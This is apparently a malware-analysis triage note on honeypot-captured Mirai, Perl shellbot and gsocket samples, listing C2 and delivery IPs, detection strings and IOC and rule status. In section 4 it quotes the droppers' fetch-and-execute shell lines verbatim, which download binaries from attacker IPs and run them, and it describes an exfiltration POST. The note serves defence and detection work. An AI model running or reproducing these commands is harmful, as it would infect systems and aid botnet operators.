# Capture triage — drosera-loot.zip (2026-08-07)

**Status: PUBLISHED for the 13 script samples. ELF analysis outstanding.**
Phases 0–5 complete for every script-based family — IOC feeds, YARA, Suricata,
blocklist, Firewalla list, README and site cards are all live. The 12 ELF payloads
are published by hash and loader context only; no strings were extracted from them
and no YARA rule claims to cover them. Author: AfterPacket. TLP:WHITE.

Archive: `drosera-loot.zip`, 25 samples + sidecars, AES-256, password `infected`.
Sightings span 2026-07-28 → 2026-08-07.

This file exists because the analysis session could not execute tooling against
the sample binaries. Everything below is **verified extraction**, not inference —
it is here so the work is not repeated. Delete this file once the five family
reports are written.

---

## 1. Family plan (5 families + 1 IOC-only campaign)

| # | Family | Anchor infrastructure | SID block | Samples |
|---|--------|----------------------|-----------|---------|
| 1 | `MIRAI_OHSHIT` | `94.154.43.123` | 9001001 | 9 (2 scripts + 7 ELF) |
| 2 | `MIRAI_TELNETCURL` | `205.237.110.232`, `60.185.49.73` | 9002001 | 7 (2 scripts + 5 ELF) |
| 3 | `PERLBOT_SHELLBOT` | `213.139.77.150:6667` (IRC) | 9003001 | 3 (all Perl) |
| 4 | `GSOCKET_SSHIT` | `192.253.248.9` | 9004001 | 1 |
| 5 | `MIRAI_LOADER` | `77.90.185.66` | 9005001 | 1 |
| — | `WEBROOT_PROBE` | ~18 IPs, bulletproof ranges | none | 2 |

`WEBROOT_PROBE` gets IOC + Firewalla entries but **no YARA rule** — see §5.

---

## 2. C2 and staging infrastructure (extracted from config blocks)

None of these appear as delivery IPs in any sidecar. All are HIGH confidence —
read directly out of sample source, not inferred.

| Indicator | Role | Source sample |
|-----------|------|---------------|
| `213.139.77.150` port `6667` | IRC C2 | `03a4f492` — `my $server = '213.139.77.150'; my $port = '6667';` |
| `205.237.110.232` | Payload server, serves `/arm /arm5 /arm7 /mips /mipsel` | `3801a288`, `e1568cae` |
| `77.90.185.66` | Mirai loader host | `246c3c37` — `SERVER="77.90.185.66"` |
| `192.253.248.9` | gsocket exfil, `POST /gsocket/up.php` | `22585585` |
| `94.154.43.123` | Both delivery **and** hardcoded payload host | `de9cfdf7`, `8b1a2fb6` |

---

## 3. Delivery IPs (HIGH — direct honeypot capture)

```
94.154.43.123     telnet   loader-fetch, //bot.* and /ohshit.sh
60.185.49.73      telnet   loader-fetch, /arm /arm5 /arm7 /mips /mipsel
160.30.204.101    ssh      /duba          Perl shellbot
77.90.185.42      ssh      /dodu          Perl shellbot (same /24 as 77.90.185.66)
192.253.248.92    ssh      /da            gsocket (exfil host is .9, same /24)
138.117.43.19     telnet   /curl.sh and /wget.sh
195.123.171.185   telnet   /wget
123.145.11.38     telnet   /home/.k
27.137.233.190    telnet   /home/.k
211.219.254.187   telnet   /home/.k
175.198.110.15    telnet   /home/.k
54.37.11.139      ssh      /gots          Perl
```

---

## 4. Chains recovered

**MIRAI_OHSHIT** — full chain.
`/tmp/.p` (104 B, `de9cfdf7`) is a single line:

```sh
wget -q http://94.154.43.123/ohshit.sh -O ohshit.sh 2>/dev/null; sh ohshit.sh; rm -rf ohshit.sh
```

`ohshit.sh` (2527 B, `8b1a2fb6`) stages in `/tmp/` via busybox and loops 16 arches:

```sh
wget http://94.154.43.123//bot.<arch>; curl -O http://94.154.43.123//bot.<arch>;cat bot.<arch> >WTF;chmod +x *;./WTF
```

Arches attempted: `x86 mips arc i468 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4`.
Note the doubled slash `//bot.` — a good detection string. Output filename `WTF`.
We captured **7 of the 16**: arm, arm7, sh4, mips, i686, ppc, x86_64.

**MIRAI_TELNETCURL** — `curl.sh` (`3801a288`) and `wget.sh` (`e1568cae`), both from
`138.117.43.19`, are the curl and busybox-wget variants of one script:

```sh
curl http://205.237.110.232/arm -o VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
busybox wget http://205.237.110.232/arm -O VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
```

Fixed per-arch output names — strong detection strings:
`VFASXC` (arm), `WQZRTY` (arm5), `YUIOXC` (arm7), `GHJKLB` (mips), `MNCXOP` (mipsel).
Exec argument `telnet.curl` is the infection-vector tag.
**The arch filenames match the `60.185.49.73` drops exactly — same kit, two hosts.**

**MIRAI_LOADER** — `/wget` (`246c3c37`): `SERVER="77.90.185.66"`, fetches
`http://$SERVER/mirai.$arch`, writes `dvrHelper`, also drops `"$dir"/.f` with
`chmod 777`. Self-identifying Mirai; `dvrHelper` is the classic binary name.

**GSOCKET_SSHIT** — `/da` (`22585585`, VT 2/60). Abuses THC gsocket / ssh-it.
Persistence via systemd unit + watchdog script. Exfils public IP (`ifconfig.me`)
to `POST http://192.253.248.9/gsocket/up.php`.

**PERLBOT_SHELLBOT** — `/duba` (`03a4f492`, VT 29/60 `trojan.perl/shellbot`),
`/dodu` (`fe6b7b4c`), `/gots` (`fd93b4f7`). `duba` and `dodu` are both **exactly
29,427 bytes** from different IPs — near-certain same bot, and `dodu` has **no VT
record at all** while `duba` sits at 29/60. Randomised nick/process from
`@rircname` / `@rps` arrays. Server overridable via `$ARGV[0]`.

---

## 5. WEBROOT_PROBE — IOC-only, deliberately no YARA

The two highest-frequency samples in the archive are also the least interesting
as files:

| SHA-256 | Size | Sightings | Content |
|---------|------|-----------|---------|
| `af77b643…` | 26 B | **168** | `#!/bin/bash` + `echo "xxxxxx"` |
| `f3abe9aa…` | 24 B | **56** | `#!/bin/sh` + `echo "xxxxxx"` |

Both written to `/var/www/html/filter` over ssh, 2026-07-28 → 2026-08-05.
These are **write-and-execute capability probes** — the operator confirms webroot
write plus RCE by looking for `xxxxxx` in the response, then returns with a real
payload. **Do not write a YARA rule**: `echo "xxxxxx"` in a two-line shell script
would false-positive on ordinary scripts and test fixtures. The value is entirely
the source IPs.

Source IPs, tightly clustered in bulletproof ranges:

```
2.57.122.209     2.57.122.168
92.118.39.77     92.118.39.50     92.118.39.71     92.118.39.49    92.118.39.14
80.94.92.234     80.94.92.55      80.94.92.179
195.178.110.217  195.178.110.232  195.178.110.228  195.178.110.227
193.32.162.84    193.32.162.34    193.32.162.15    193.32.162.27
```

Netblocks: `2.57.122.0/24`, `92.118.39.0/24`, `80.94.92.0/24`, `195.178.110.0/24`,
`193.32.162.0/24`. Rotation is ~2 IPs/day within these ranges — block the /24s at
perimeter if policy allows, but `blocklist.txt` takes **individual IPs only**.

---

## 6. DO NOT BLOCK

These appear in sample source but are legitimate shared infrastructure. Adding
them breaks real traffic and violates the repo's CDN rule:

```
gsocket.io        thc.org        github.com        ifconfig.me
```

`gsocket.io` and `thc.org` are the real THC project — the sample abuses a
legitimate tool. Attribute the abuse, not the tool.

---

## 7. Done

- 7 IOC feeds — one per family, in `ioc/`.
- 5 YARA rules. **None ship for `WEBROOT_PROBE` or `BOTKILL_PROCWIPE`** — both
  would false-positive on ordinary shell scripts. That is a decision, not a gap.
- 6 Suricata rulesets, SID blocks 9001001–9007003, registry updated in README.
- `blocklist.txt` — 34 IPs, no domains, no comments, no blank lines.
- `firewalla/drosera_block.txt`, `README.md` family sections, `index.html` cards
  and hero counters.

## 8. Outstanding

- **ELF string extraction for 12 binaries.** No `strings` / `readelf` on this box;
  ripgrep skips binaries. Use `tools/binstrings.py` (written for exactly this) —
  `python3 tools/binstrings.py <sample> -n 6` and `--header`. **Untested** — the
  session that wrote it was blocked from executing anything against the samples.
  Pending: 7 × `MIRAI_OHSHIT`, 5 × `MIRAI_TELNETCURL`.
- **Sample zips.** `samples/` is still empty — no AES-256 archives were created.
  The card and README download rows deliberately omit sample links rather than
  point at files that do not exist.
- **MD5 / SHA-1.** Not computed for any sample; hashing tools could not be run.
  Every IOC file states this rather than silently omitting the fields.
- Per-family long-form reports (`reports/<FAMILY>_analysis_<sha8>.md`).
- `drosera-detection-bundle.zip` regeneration.
- **VT note:** only 3 of 25 samples carry any VT record (29/60, 15/60, 2/60).
  The other 22 have `scan: null` or `known: false`. Report per-sample; never
  claim zero detections where the sidecar simply has no data.
